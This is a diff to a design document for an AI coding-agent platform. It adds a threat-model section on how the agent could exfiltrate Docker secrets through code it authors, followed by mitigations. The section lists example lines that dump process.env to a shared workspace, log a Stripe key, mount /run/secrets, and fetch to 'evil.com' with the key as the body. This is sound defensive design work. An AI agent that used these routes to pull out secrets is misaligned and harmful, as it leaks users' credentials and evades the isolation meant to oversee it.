@@ -406,6 +406,28 @@ The agent container is not a compose service, so Docker secrets don't apply. For
 - Orchestrator passes `--env-file .shipit/.env.agent` on `docker create`. This file is on the orchestrator's filesystem, not the workspace volume.
 - The agent only gets entries explicitly marked `agent: true` — typically connection strings, not real secrets.
 
+### Limitations: agent controls the code
+
+Docker secrets prevent the agent from *directly* reading secret files from the filesystem. But the agent authors the code that runs inside service containers — and that code has the secrets as env vars. A determined agent can exfiltrate secrets through the code it writes:
+
+- **Write to workspace.** `fs.writeFileSync('/workspace/leaked.json', JSON.stringify(process.env))` — the workspace volume is shared, so the agent can read the file back.
+- **Log to stdout.** `console.log(process.env.STRIPE_KEY)` — appears in compose logs, which the orchestrator streams to the browser and the agent can observe.
+- **Modify the compose file.** Add a volume mount that exposes `/run/secrets` to the workspace, then read the files directly on the next `docker compose up`.
+- **Network exfiltration.** `fetch('https://evil.com', { body: process.env.STRIPE_KEY })` — the service container has network access.
+
+This is a fundamental constraint: **you can't give secrets to code while hiding them from the code's author.** The agent controls what the service containers run. As long as the code has access to secret values, the agent can extract them through the code.
+
+**What Docker secrets still buy us:**
+- **Prevents accidental leakage.** The agent can't casually `cat .shipit/.env.api` while exploring the workspace. Exfiltration requires deliberately writing code for that purpose.
+- **Raises the bar.** Moving from "read a file" to "write exfiltration code, deploy it to a service container, read it back" is a meaningful increase in difficulty and intentionality.
+- **Audit surface.** Exfiltration requires code changes — which are tracked by git auto-commit. Writing `process.env` to a file or logging it leaves a trail in the commit history.
+- **Per-service scoping is still enforced.** Even if the agent exfiltrates from one service, it can't access secrets declared on a different service without writing and deploying code to that specific service.
+
+**Possible future mitigations** (not in scope for this design):
+- **Code review on secret access.** Flag `process.env` reads in agent-authored code that reference known secret names. Surface as a warning, not a block.
+- **Read-only workspace for services.** Mount workspace as read-only in service containers, preventing the "write to workspace" vector. Requires services to use a separate writable volume for runtime data.
+- **Network policy.** Restrict outbound network from service containers to known endpoints, preventing the exfiltration-via-HTTP vector.
+
 ### Other considerations
 
 - **`.shipit/` is gitignored.** Any fallback files are never committed.
